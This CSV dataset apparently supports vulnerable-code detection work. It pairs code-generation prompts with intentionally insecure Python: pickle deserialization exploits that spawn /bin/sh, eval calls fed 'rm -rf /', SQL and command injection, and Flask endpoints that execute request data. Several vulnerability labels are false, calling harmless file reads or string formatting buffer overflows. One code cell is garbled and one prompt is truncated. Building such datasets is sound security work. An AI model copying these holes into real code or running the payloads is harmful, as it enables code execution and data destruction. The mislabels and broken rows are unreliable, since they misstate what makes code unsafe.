prompt,vulnerable_code,vulnerability,num_lines,is_vul
"Write a python code that uses the pickle module to serialize an object that when deserialized, executes an operating system command to print out the message 'You have been hacked'.","```python
import pickle
import os

class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked""',))

def serialize_exploit():
    with open('exploit.pkl', 'wb') as f:
        pickle.dump(EvilPickle(), f)

serialize_exploit()
```",Python's pickle module may be used to unpickle an object which could execute arbitrary Python code leading to a Remote Code Execution (RCE) vulnerability.,14,1
"Write a python code that imports the os module and takes user input. Then, it evaluates the user'input as a python expression.","```python
import os
user_input = input(""Enter something here: "")
eval(user_input)
```",The Python `eval()` function can lead to arbitrary code execution if input is not properly sanitized.,5,1
"Write a python code that uses pickle module to serialize and deserialize an object. The object should override the `__reduce__` method to execute an arbitrary system command when unpickled. The command should be 'echo ""You have been hacked!""'.","```python
import pickle
import os

class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked!""',))

data = pickle.dumps(EvilPickle())
pickle.loads(data)
```","In Python, the pickle module insecurely deserializes data. It can lead to arbitrary code execution if attackers can control the data being deserialized.",11,1
"Write a python code that starts a new thread, waits for 5 seconds, and then stops the thread after another 5 seconds.","```python
import threading
import time

def worker():
    print(""Thread Started"")
    time.sleep(10)  # Simulate some work
    print(""Thread Finished"")

print(""Main Thread Started"")
t = threading.Thread(target=worker)
t.start()
time.sleep(5)  # Wait for the thread to start
print(""Main Thread Finished"")
```",The Python Global Interpreter Lock (GIL) can lead to deadlocks when dealing with multi-threading or multiprocessing.,15,1
Write a python code that uses the pickle module to create a serialized object that executes an os command to echo a message into a file. The message should be 'You have been hacked!' and it should be written into a file named '/tmp/hacked.txt'.,"```python
import pickle
import os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked!"" > /tmp/hacked.txt',))

def serialize_exploit():
    serialized = pickle.dumps(Exploit())
    return serialized

def exploit_system():
    exploit_data = serialize_exploit()
    pickle.loads(exploit_data)

if __name__ == '__main__':
    exploit_system()
```",A buffer overflow vulnerability in Python's pickle module could be exploited by an attacker to execute arbitrary code when data is unpickled.,19,1
Write a python code that opens and reads a text file named 'large_file.txt'.,"```python
def read_file(filename):
    with open(filename, 'r') as file:
        content = file.read()
    return content

print(read_file('large_file.txt'))
```","The Python code may have a buffer overflow vulnerability when dealing with strings of unknown length, which can lead to a crash or system access.",8,1
"Write a python code that uses Flask framework to create a web server. The server should have an endpoint '/execute' which accepts POST requests. When a POST request is received at this endpoint, it should extract the 'code' field from the request data and execute it using Python's built-in eval() function. After executing the code, it should return the string 'Code executed'. If the script is run directly, start the Flask development server in debug mode.","```python
# Importing necessary modules
import os
from flask import Flask, request

app = Flask(__name__)

@app.route('/execute', methods=['POST'])
def execute_code():
    code = request.form.get('code')
    eval(code)
    return 'Code executed'

if __name__ == ""__main__"":
    app.run(debug=True)
```","The vulnerability of using eval() function in Python can lead to code injection attacks, which can execute arbitrary code.",16,1
"Write a python code that defines a function named 'infinite_loop' which takes an integer 'n' as input. This function should enter an infinite loop where it increments the value of 'n' by 1 and then calls itself with the incremented value of 'n'. When called, this function should start an infinite loop.","```python
def infinite_loop(n):
    while True:
        n += 1
        infinite_loop(n)

infinite_loop(0)
```","Potential Uncontrolled Resource Consumption - In Python, an infinite loop or recursion without proper exit conditions can lead to resource exhaustion (like CPU and memory).",8,1
"Write a python code that uses Flask and SQLite3 to create a web application with a login page. The login page should have a form where users can input their username and password. When the form is submitted, the code will check these credentials against a database of users. If the credentials match an entry in the database, it will return 'Login Successful!' Otherwise, it will return 'Invalid credentials!'.","```python
import sqlite3
from flask import Flask, request, render_template

app = Flask(__name__)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']

        conn = sqlite3.connect('users.db')
        cursor = conn.cursor()

        query = ""SELECT * FROM users WHERE username='{}' AND password='{}'"".format(username, password)
        results = cursor.execute(query).fetchall()

        if len(results) > 0:
            return ""Login Successful!""
        else:
            return ""Invalid credentials!""

    return render_template('login.html')

if __name__ == '__main__':
    app.run(debug=True)
```",A Python code might expose sensitive data if it fails to properly sanitize or validate user input.,28,1
"Write a python code that imports the os module and defines a function named 'execute_command' which takes an input from the user, executes it using the os.system() function, and then calls this function with the user's input.","```python
import os

def execute_command(user_input):
    os.system(user_input)

execute_command(input(""Enter your command: ""))
```","A possible vulnerability in Python could be improper handling of user input, leading to a command injection attack.",8,1
Write a python code that defines a function named 'unsafe_function' which takes user input as an argument. This function should use the built-in Python function 'eval' to execute the user input as Python code. The user input in this case is a string that attempts to delete all files in the root directory of the system using the 'rm -rf /' command.,"```python
def unsafe_function(user_input):
    eval(user_input)

unsafe_function(""__import__('os').system('rm -rf /')"")
```",Python code might be vulnerable to injection attacks if it uses the `eval()` function or similar functions that interpret string inputs as Python code.,6,1
"Write a python code that takes user input and prints 'Hello, [user's input]'. The program should ask the user to enter their name and then print 'Hello, [user's input]'.","```python
import os

def run_command(user_input):
    command = ""echo Hello, "" + user_input
    os.system(command)

def main():
    user_input = input(""Enter your name: "")
    run_command(user_input)

if __name__ == ""__main__"":
    main()
```",A Python script that uses the eval() function without proper input validation can lead to arbitrary code execution.,14,1
Write a python code that uses the pickle module to serialize and deserialize an object that executes '/bin/sh' when unpickled.,"```python
import pickle
import os

class RunBinSh(object):
    def __reduce__(self):
        return (os.system, ('/bin/sh',))

def serialize_exploit():
    malicious_data = pickle.dumps(RunBinSh())
    return malicious_data

def deserialize_exploit(malicious_data):
    pickle.loads(malicious_data)

if __name__ == '__main__':
    malicious_data = serialize_exploit()
    deserialize_exploit(malicious_data)
```",The Python pickle module can lead to arbitrary code execution if the data being unpickled comes from an untrusted source.,19,1
"Write a python code that uses threads to increment and decrement a shared counter value. The counter should be incremented 100,000 times and then decremented 100,000 times. Print out the final value of the counter.","```python
import threading

class Counter:
    def __init__(self):
        self.value = 0

def increment(counter):
    for _ in range(100000):
        counter.value += 1

def decrement(counter):
    for _ in range(100000):
        counter.value -= 1

counter = Counter()
t1 = threading.Thread(target=increment, args=(counter,))
t2 = threading.Thread(target=decrement, args=(counter,))

t1.start()
t2.start()

t1.join()
t2.join()

print(counter.value)
```","Python lacks memory safety and does not have built-in support for multithreading or concurrency without the use of external libraries, allowing for potential race conditions and deadlocks.",27,1
"Write a python code that takes user input, formats it into a string and prints it out.","```python
import struct

def format_string(user_input):
    return ""User input: %s"" % user_input

def main():
    user_input = input(""Enter some text: "")
    formatted = format_string(user_input)
    print(formatted)

if __name__ == ""__main__"":
    main()
```","A potential buffer overflow vulnerability in Python could occur from unchecked user input, leading to memory corruption.",14,1
"Write a python code that imports the os module and defines a function named 'unsafe_function'. This function should take user input, evaluate it using the built-in eval function, and execute it. Call this function at the end.","```python
import os

def unsafe_function():
    user_input = input(""Enter something: "")
    eval(user_input)

unsafe_function()
```",The use of `eval()` function without proper sanitization can lead to arbitrary code execution.,9,1
"Write a python code that uses Flask framework to create a web application. The application should have a route '/' which takes an optional query parameter 'name'. If 'name' is provided in the URL, it should display 'Hello, [name]!' on the webpage. If 'name' is not provided, it should display 'Hello, !'.","```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/')
def home():
    name = request.args.get('name', '')
    return render_template_string('Hello, %s!' % name)

if __name__ == ""__main__"":
    app.run(debug=True)
```",Incomplete input validation in URL parameter handling in Flask web application may lead to Cross-Site Scripting (XSS) attacks.,13,1
"Write a python code that uses Flask to create a web server. The server should have an endpoint '/execute' that accepts POST requests. When a POST request is made to this endpoint, it should get the 'command' from the request form and execute it using the os.system() function. After executing the command, it should return the message 'Command executed'. Run the server in debug mode.","```python
from flask import Flask, request
import os

app = Flask(__name__)

@app.route('/execute', methods=['POST'])
def execute_command():
    command = request.form.get('command')
    os.system(command)
    return 'Command executed'

if __name__ == '__main__':
    app.run(debug=True)
```","In Python, a vulnerability could be caused by a lack of input validation in a web application, leading to injection attacks.",15,1
"Write a python code that takes user input, appends it to an echo command and counts the number of characters in the input using the wc -c command. The program should keep asking for user input until it is manually stopped.","```python
import os
def execute_command(user_input):
    command = 'echo -n ' + user_input + ' | wc -c'
    os.system(command)

while True:
    user_input = input(""Enter your string: "")
    execute_command(user_input)
```","A potential buffer overflow vulnerability in Python code can occur when a programmer does not properly handle user input, leading to an error.",10,1
"Write a python code that uses pickle module to serialize an object that when unpickled, executes a system command to print out 'Hacked!'.","```python
import pickle
import os

class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('echo ""Hacked!""',))

pickled_data = pickle.dumps(EvilPickle())

# This will execute 'echo ""Hacked!""'
pickle.loads(pickled_data)
```",Python's pickle module may expose your application to arbitrary code execution when deserializing untrusted data.,13,1
"Write a python code that uses pickle module to serialize and deserialize an object. The object should override the `__reduce__` method to execute the command 'echo ""Hacked!""' using the os.system function.","```python
import pickle
import os

class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('echo ""Hacked!""',))

data = pickle.dumps(EvilPickle())
pickle.loads(data)
```","In Python, a potential vulnerability arises from using pickle module for serialization and deserialization due to its ability to execute arbitrary Python code.",11,1
Write a python code that starts a web server using Flask. The server should have a POST endpoint at '/evaluate' which accepts JSON data containing an arithmetic expression in the format {'expression': '<arithmetic expression>'}. The server should evaluate the received arithmetic expression and return the result.,"```python
import flask

app = flask.Flask(__name__)

@app.route('/evaluate', methods=['POST'])
def evaluate():
    data = flask.request.get_json()
    result = eval(data['expression'])
    return str(result)

if __name__ == '__main__':
    app.run(debug=True)
```",The use of `eval()` function without proper input validation or sanitization can lead to arbitrary code execution.,14,1
"Write a python code that imports the os module and defines a function named 'run_user_input'. This function should take user input, evaluate it using the eval function, and execute it. Finally, call this function.","```python
import os

def run_user_input():
    user_input = input(""Enter command: "")
    eval(user_input)

run_user_input()
```",The use of `eval()` function in Python can lead to arbitrary code execution if it's used on untrusted input.,9,1
"Write a python code that defines a function named 'format_string' which takes an input 'user_input'. This function should return a string that says 'Your input was: ' followed by the value of 'user_input'. Then, create a variable 'user_input' and assign it a string of 'A' repeated 10000000 times. Finally, print the result of calling 'format_string' with 'user_input' as the argument.","```python
def format_string(user_input):
    return ""Your input was: %s"" % user_input

user_input = ""A"" * 10000000
print(format_string(user_input))
```","In Python, it's possible for a developer to introduce a buffer overflow vulnerability when handling untrusted input into a string formatting function.",7,1
"Write a python code that creates a text file, reads its content, and then deletes the file.","```python
import os

def read_file(filename):
    return open(filename, 'r').read()

def write_file(filename, content):
    open(filename, 'w').write(content)

def delete_file(filename):
    os.remove(filename)

def main():
    filename = 'test.txt'
    content = 'This is some content.'

    write_file(filename, content)
    print(read_file(filename))
    delete_file(filename)

if __name__ == ""__main__"":
    main()
```","The vulnerability in Python code can be a lack of error handling for file operations, leading to a crash or data loss.",23,1
"Write a python code that defines a function named 'check_password' which takes a string 'password' as an argument. The function should compare each character of the input password with the correct password character by character. If any character does not match or if the ASCII value of the input password character is greater than the ASCII value of the correct password character, the function should return False. Otherwise, it should return True. Also, if the ASCII value of the input password character is greater than the ASCII value of the correct password character, the function should wait for 0.1 seconds.","```python
import time

def check_password(password):
    correct_password = ""correct_password""
    if len(password) != len(correct_password):
        return False
    for p, c in zip(password, correct_password):
        if p != c:
            return False
        if ord(p) > ord(c):
            time.sleep(0.1)
    return True

# Testing the function
start = time.time()
print(check_password(""incorrect_password""))  # Should print False
end = time.time()
print(""Time taken: "", end - start)

start = time.time()
print(check_password(""correct_password""))  # Should print True
end = time.time()lowing
```",A timing attack vulnerability in Python code where time-based operations may expose sensitive information.,24,1
"Write a python code that uses the pickle module to create a malicious pickle object that executes an arbitrary system command when unpickled. The malicious pickle object should execute the command 'echo ""You have been hacked!""' when unpickled.","```python
import pickle
import os

class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked!""',))

def serialize_exploit():
    data = pickle.dumps(EvilPickle())
    with open('exploit.pkl', 'wb') as f:
        f.write(data)

def deserialize_exploit():
    with open('exploit.pkl', 'rb') as f:
        pickle.load(f)

serialize_exploit()
deserialize_exploit()
```",Python's pickle module may expose application to arbitrary code execution vulnerabilities when deserializing untrusted data.,20,1
Write a python code that defines a function named 'get_value' which takes a dictionary and a key as input. The function should return the value associated with the given key in the dictionary. Then create a dictionary named 'my_dict' with keys 'name' and 'age'. Set the value of 'name' to 'John' and 'age' to 30. Call the 'get_value' function twice with 'my_dict' and 'name' and 'city' as arguments respectively. Print the returned values.,"```python
def get_value(dic, key):
    return dic[key]

my_dict = {""name"": ""John"", ""age"": 30}
print(get_value(my_dict, ""name""))
print(get_value(my_dict, ""city""))
```","In Python, a lack of 'None' check when accessing dictionary values can lead to a KeyError crash.",8,1
Write a python code that imports the os module and uses the eval function to execute a command to list all files in the current directory.,"```python
import os
input_str = ""__import__('os').system('dir')""
eval(input_str)
```",The use of eval() function in Python may lead to arbitrary code execution if the input isn't properly sanitized.,5,1
"Write a python code that takes user input, appends a null character at the end of the string and then prints the modified string.","```python
def process_data(user_input):
    data = user_input + '\0'
    return data

def main():
    user_input = input(""Enter your data: "")
    data = process_data(user_input)
    print(data)

if __name__ == ""__main__"":
    main()
```","Potential buffer overflow vulnerability in Python due to not checking the length of strings passed as arguments"".",13,1
"Write a python code that connects to an SQLite database named 'mydatabase.db'. The code should have a function called 'get_user_data' which takes a username as an argument, queries the 'users' table in the database for a record where the 'username' matches the provided username, and returns the user data. Then, prompt the user to enter their username, call the 'get_user_data' function with the entered username, and print the returned user data.","```python
import sqlite3

def get_user_data(username):
    conn = sqlite3.connect('mydatabase.db')
    cursor = conn.cursor()
    query = ""SELECT * FROM users WHERE username = '"" + username + ""'""
    cursor.execute(query)
    user = cursor.fetchone()
    return user

username = input(""Enter your username: "")
user_data = get_user_data(username)
print(user_data)
```",The Python interpreter does not automatically sanitize input data which can lead to SQL injection if the application uses unsanitized user input directly into SQL queries.,15,1
Write a python code that connects to a SQLite database named 'mydatabase.db'. The code should have a function called 'get_user_info' which takes a 'username' as an argument. This function should execute a SQL query to fetch all information from the 'users' table where the 'username' matches the input 'username'. It should then return the fetched user information.,"```python
import sqlite3
def get_user_info(username):
    conn = sqlite3.connect('mydatabase.db')
    cursor = conn.cursor()
    query = ""SELECT * FROM users WHERE username='{}'"".format(username)
    cursor.execute(query)
    user_info = cursor.fetchone()
    return user_info
```",Possible SQL injection vulnerability due to improper use of string formatting or concatenation methods for database queries.,10,1
"Write a python code that defines a function named 'vulnerable_function' which takes an input string 'user_input'. The function should create a byte array 'buffer' of size 1024. Then, it should iterate over each character in 'user_input', and assign each character to the corresponding index in 'buffer'. Finally, it should return the 'buffer'. After defining the function, take user input and call the function with the user input.","```python
def vulnerable_function(user_input):
    buffer = bytearray(1024)
    for i in range(len(user_input)):
        buffer[i] = user_input[i]
    return buffer

user_input = input(""Enter your input: "")
vulnerable_function(user_input)
```",Possible buffer overflow vulnerability in Python due to unchecked input length.,10,1
"Write a python code that imports the os module and defines a function named 'run_user_input'. This function should take user input, evaluate it using the eval function, and execute it. Call this function at the end.","```python
import os

def run_user_input():
    user_input = input(""Enter your command: "")
    eval(user_input)

run_user_input()
```","The 'eval' function in Python can execute arbitrary code, leading to potential security risks if data from untrusted sources is passed to it.",9,1
"Write a python code that takes user input, converts each character of the input into its ASCII value and stores it in a buffer. The program should continue to take user input until it is manually stopped.","```python
def process_input(user_input):
    buffer = bytearray(1024)
    for i in range(len(user_input)):
        buffer[i] = user_input[i]
    return buffer

while True:
    user_input = input(""Enter your input: "")
    print(process_input(user_input))
```",A buffer overflow vulnerability in Python could occur if a programmer doesn't properly validate or enforce input length restrictions.,11,1
"Write a python code that uses Flask and SQLite3 to create a web application with a '/login' route that accepts POST requests. The route should take a username and password from the request, check them against a SQLite database named 'users.db' in a table named 'users'. If the username and password match a row in the table, it should return 'Login successful!' otherwise it should return 'Invalid credentials!'.","```python
import sqlite3
from flask import Flask, request

app = Flask(__name__)

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    
    query = ""SELECT * FROM users WHERE username='{}' AND password='{}'"".format(username, password)
    cursor.execute(query)
    
    if cursor.fetchone():
        return 'Login successful!'
    else:
        return 'Invalid credentials!'

if __name__ == '__main__':
    app.run(debug=True)
```","In Python, a common vulnerability is failure to sanitize user input, leading to injection attacks such as SQL injection or command injection.",25,1
"Write a python code that uses the pickle module to serialize and deserialize an object. The object should be an instance of a class called EvilPickle. This class has a special method __reduce__ that returns a tuple where the first element is the os.system function and the second element is a string 'echo ""You have been hacked!""'. When you run this code, it will execute the command 'echo ""You have been hacked!""' in the system shell.","```python
import pickle
import os

class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked!""',))

def serialize_and_deserialize(obj):
    serialized = pickle.dumps(obj)
    deserialized = pickle.loads(serialized)
    return deserialized

if __name__ == '__main__':
    serialize_and_deserialize(EvilPickle())
```","Python's pickle module can lead to arbitrary code execution due to the use of the 'load' function, which can unpickle data from an opaque byte stream.",16,1
Write a python code that creates a malicious class named `EvilClass`. This class has a special method `__reduce__` which returns a tuple containing the function `os.system` and a string argument `'echo,"```python
import pickle
import os

class EvilClass(object):
    def __reduce__(self):
        return (os.system, ('echo ""Hacked!"" > /tmp/hacked.txt',))

def serialize_and_write(obj, filename):
    with open(filename, 'wb') as f:
        pickle.dump(obj, f)

def read_and_deserialize(filename):
    with open(filename, 'rb') as f:
        return pickle.load(f)

serialize_and_write(EvilClass(), '/tmp/malicious.pkl')
read_and_deserialize('/tmp/malicious.pkl')
```",Python's pickle module can lead to arbitrary code execution if the data being unpickled is tampered with.,19,1
"Write a python code that fetches data from a given URL and saves it in a text file named 'data.txt'. The program should prompt the user to enter a URL, fetch the data from the URL using the requests library, and then write the fetched data into a text file.","```python
import os
import requests

def fetch_data(url):
    response = requests.get(url)
    return response.text

def save_data(data):
    with open('data.txt', 'w') as f:
        f.write(data)

def main():
    url = input(""Enter a URL: "")
    data = fetch_data(url)
    save_data(data)

if __name__ == ""__main__"":
    main()
```","In Python, it's possible for users to create a code vulnerability through unvalidated input. This allows an attacker to exploit this to inject malicious code.",20,1
"Write a python code that imports the os module and defines a function named 'execute_user_input'. This function should take user input, evaluate it using the built-in eval function, and then execute it. Finally, call this function.","```python
import os
def execute_user_input():
    user_input = input(""Enter your command: "")
    eval(user_input)

execute_user_input()
```","In Python, the usage of eval() function can lead to arbitrary code execution if the input is not properly sanitized.",8,1
"Write a python code that imports the `os` module and defines a function `run_code()` which takes in a string `user_input`, evaluates it using the `eval()` function, and then runs it. If the script is run directly (i.e., not imported as a module), it asks the user to enter some Python code, stores their input in `user_input`, and passes it to `run_code()`.","```python
import os

def run_code(user_input):
    eval(user_input)

if __name__ == ""__main__"":
    user_input = input(""Enter some Python code: "")
    run_code(user_input)
```",Possible vulnerability of 'eval' function misuse can lead to arbitrary code execution.,10,1
Write a python code that connects to an SQLite database named 'mydatabase.db'. The code should have a function called 'get_user_info' which takes a username as input and returns the information of that user from the 'users' table in the database.,"```python
import sqlite3

def get_user_info(username):
    conn = sqlite3.connect('mydatabase.db')
    cursor = conn.cursor()
    
    query = ""SELECT * FROM users WHERE username='{}'"".format(username)
    cursor.execute(query)
    
    result = cursor.fetchone()
    return result

# Test
print(get_user_info(""admin""))
```",The code may have a SQL injection vulnerability due to unsanitized user input into a SQL query.,16,1
"Write a python code that creates a web application using Flask framework. The application should have a route '/search' which accepts GET requests. When a GET request is made to this route, it should take a query parameter 'q' from the request. It should then connect to an SQLite database named 'my_database.db'. It should execute a SQL query to select all rows from the table 'users' where the 'username' matches the query parameter 'q'. It should fetch all the results and return them as a string.","```python
import sqlite3
from flask import Flask, request

app = Flask(__name__)

@app.route('/search', methods=['GET'])
def search():
    query = request.args.get('q')
    conn = sqlite3.connect('my_database.db')
    cursor = conn.cursor()
    cursor.execute(f""SELECT * FROM users WHERE username='{query}'"")
    results = cursor.fetchall()
    return str(results)

if __name__ == '__main__':
    app.run(debug=True)
```","A vulnerability in Python code can be a result of improper handling of user input, leading to injection attacks like SQL Injection or Command Injection.",18,1
"Write a python code that uses Flask and SQLite3 to create a web application with a '/login' route that accepts POST requests. The route should take a username and password from the request, check them against a SQLite database table named 'users' where the username and password fields match exactly. If a matching record is found, return a success message with status code 200. Otherwise, return an error message with status code 401.","```python
from flask import Flask, request
import sqlite3

app = Flask(__name__)

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    
    query = ""SELECT * FROM users WHERE username='{}' AND password='{}'"".format(username, password)
    cursor.execute(query)
    
    user = cursor.fetchone()
    if user:
        return 'Logged in successfully', 200
    else:
        return 'Invalid credentials', 401

if __name__ == '__main__':
    app.run(debug=True)
```",Python code vulnerable to SQL injection due to unsafe string formatting or concatenation.,26,1
"Write a python code that imports pickle and os modules. Define a class named RunBinSh which has a special method __reduce__ that returns a tuple containing os.system function and '/bin/sh' string. Then, use pickle.dumps to serialize an instance of RunBinSh class and assign it to variable data. Finally, use pickle.loads to deserialize data.","```python
import pickle
import os

class RunBinSh(object):
    def __reduce__(self):
        return (os.system, ('/bin/sh',))

data = pickle.dumps(RunBinSh())
pickle.loads(data)
```",Python's pickle module can lead to arbitrary code execution if deserializing untrusted data.,11,1
"Write a python code that uses Flask and SQLite3 to create a web application with a '/login' route that accepts POST requests. The route should take a username and password from the request, check them against a SQLite database named 'users.db' in a table named 'users'. If the username and password match a record in the database, return 'Login successful!' otherwise return 'Invalid credentials!'.","```python
import sqlite3
from flask import Flask, request

app = Flask(__name__)

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    
    query = ""SELECT * FROM users WHERE username='{}' AND password='{}'"".format(username, password)
    cursor.execute(query)
    
    if cursor.fetchone() is not None:
        return 'Login successful!'
    else:
        return 'Invalid credentials!'

if __name__ == '__main__':
    app.run(debug=True)
```","In Python, not properly validating or sanitizing user input can lead to SQL injection attacks.",25,1
"Write a python code that takes user input and prints 'Hello, [user's input]'. The program should ask the user to enter their name and then print 'Hello, [user's input]'.","```python
import os

def run_command(user_input):
    command = ""echo Hello, "" + user_input
    os.system(command)

def handle_request():
    user_input = input(""Enter your name: "")
    run_command(user_input)

handle_request()
```",The Python 'eval' function can lead to arbitrary code execution if not used properly.,13,1
"Write a python code that imports the os module and defines a function named 'unsafe_function'. This function should take user input, evaluate it using the built-in eval function, and execute it. Call this function at the end.","```python
import os

def unsafe_function():
    user_input = input(""Enter something: "")
    eval(user_input)

unsafe_function()
```",Use of `eval()` function can lead to arbitrary code execution due to its ability to execute Python expressions.,9,1
"Write a python code that imports the os module and defines a function named 'execute_command' which takes a string input from the user. This function should concatenate the string 'ls ' with the user input and store it in a variable named 'command'. Then, it should use the os.system() function to execute the command stored in the 'command' variable.","```python
import os

def execute_command(user_input):
    command = ""ls "" + user_input
    os.system(command)

execute_command(""-la"")
```","In Python, a potential input validation vulnerability exists where a function does not sufficiently validate user input, potentially leading to command injection attacks.",9,1
Write a python code that asks the user for their name and then prints a greeting message using their name.,"```python
def get_user_input():
    return input(""Enter your name: "")

def print_greeting(name):
    print(""Hello, %s!"" % name)

def main():
    name = get_user_input()
    print_greeting(name)

if __name__ == ""__main__"":
    main()
```",Potential buffer overflow vulnerability in Python due to incorrect use of string formatting,14,1
"Write a python code that generates a random integer between 1 and 10. Then, divide 10 by this random number. Handle possible exceptions such as division by zero or any other unexpected errors.","```python
import random

def generate_random_integer():
    return random.randint(1, 10)

def divide_by_zero():
    try:
        number = generate_random_integer()
        result = 10 / number
        print(""Result: "", result)
    except ZeroDivisionError:
        print(""Cannot divide by zero"")
    except Exception as e:
        print(""An error occurred: "", e)

divide_by_zero()
```","In Python, a common vulnerability is the lack of proper handling of exception errors. Failure to handle exceptions can lead to unhandled runtime errors and application crashes.",18,1
"Write a python code that uses Flask framework to create a web server. The server should have an endpoint '/execute' which accepts POST requests. When a POST request is made to this endpoint, it should receive a piece of code in the form data with key 'code'. This code should be executed using Python's built-in function 'eval()'. If the code is not properly formatted or contains any security risks, it could lead to serious vulnerabilities.","```python
from flask import Flask, request
app = Flask(__name__)

@app.route('/execute', methods=['POST'])
def execute_code():
    code = request.form.get('code')
    eval(code)

if __name__ == '__main__':
    app.run(debug=True)
```","The Python `eval()` function can pose a security risk as it executes arbitrary code, which can lead to remote code execution.",12,1
"Write a python code that defines a function named 'evaluate_input' which takes no arguments. This function should prompt the user to enter some Python code, store the entered code in a variable named 'user_input', and then execute the code stored in 'user_input' using the built-in Python function 'eval'. After defining the function, call the function.","```python
def evaluate_input():
    user_input = input(""Enter some Python code: "")
    eval(user_input)

evaluate_input()
```","In Python, a potential security risk is the 'eval' function, which can execute arbitrary code. This poses a security risk if untrusted input is passed through it.",7,1
Write a python code that imports the os module and defines a function named 'unsafe_function' which takes user input as an argument. This function should use the built-in Python function 'eval' to execute the user input as Python code. The user input in this case is a string that will delete all files in the root directory of the system when executed.,"```python
import os

def unsafe_function(user_input):
    eval(user_input)

unsafe_function(""os.system('rm -rf /')"")
```","Python's `eval()` function can execute arbitrary code, posing a security risk if used carelessly.",8,1
"Write a python code that connects to an SQLite database named 'my_database.db'. The code should have a function called 'fetch_user_data' which takes a username as an argument, queries the 'users' table in the database for the row where the 'username' matches the given argument, and returns the row data. Then, the code should ask the user to enter their username, call the 'fetch_user_data' function with the entered username, and print the returned user data.","```python
import sqlite3
def fetch_user_data(username):
    conn = sqlite3.connect('my_database.db')
    cursor = conn.cursor()
    query = ""SELECT * FROM users WHERE username='{}'"".format(username)
    cursor.execute(query)
    row = cursor.fetchone()
    return row

username = input(""Enter your username: "")
user_data = fetch_user_data(username)
print(user_data)
```",Code injection vulnerabilities can occur when user input is not properly sanitized before being used in a SQL query which can lead to data manipulation.,14,1
Write a python code that uses the pickle module to serialize and deserialize an object that executes '/bin/sh' command.,"```python
import pickle
import os

class RunBinSh(object):
    def __reduce__(self):
        return (os.system, ('/bin/sh',))

def serialize_exploit():
    malicious_data = pickle.dumps(RunBinSh())
    return malicious_data

def deserialize_exploit(malicious_data):
    pickle.loads(malicious_data)

if __name__ == '__main__':
    malicious_data = serialize_exploit()
    deserialize_exploit(malicious_data)
```","Python's pickle module can lead to arbitrary code execution if used for untrusted data"".",19,1
"Write a python code that imports the os module and defines a function named 'run_user_input'. This function should take user input, evaluate it as python code using the built-in eval function, and then execute it.","```python
import os

def run_user_input():
    user_input = input(""Enter some Python code: "")
    eval(user_input)

run_user_input()
```",Python's built-in eval() function can lead to arbitrary code execution if used incorrectly due to unsanitized user input.,9,1
"Write a python code that continuously asks the user to enter Python code and executes it. After each execution, pause for one second.","```python
import time

def execute_user_input():
    user_input = input(""Enter some Python code: "")
    eval(user_input)

while True:
    execute_user_input()
    time.sleep(1)
```","The use of 'eval' function in Python can lead to arbitrary code execution, making it prone to injection attacks.",11,1
Write a python code that uses the pickle module to serialize and deserialize an object that executes '/bin/sh' when unpickled.,"```python
import pickle
import os

class RunBinSh(object):
    def __reduce__(self):
        return (os.system, ('/bin/sh',))

def serialize_exploit():
    malicious_data = pickle.dumps(RunBinSh())
    return malicious_data

def deserialize_exploit(malicious_data):
    pickle.loads(malicious_data)

if __name__ == '__main__':
    malicious_data = serialize_exploit()
    deserialize_exploit(malicious_data)
```",The Python pickle module is vulnerable to arbitrary code execution due to its unpickling of untrusted data.,19,1
"Write a python code that takes user input, evaluates it as a command and executes it using the os module.","```python
import os

def execute_command(user_input):
    command = eval(user_input)
    os.system(command)

user_input = input(""Enter your command: "")
execute_command(user_input)
```",Potential unchecked file access vulnerability in Python due to unsafe use of `eval()` function.,10,1
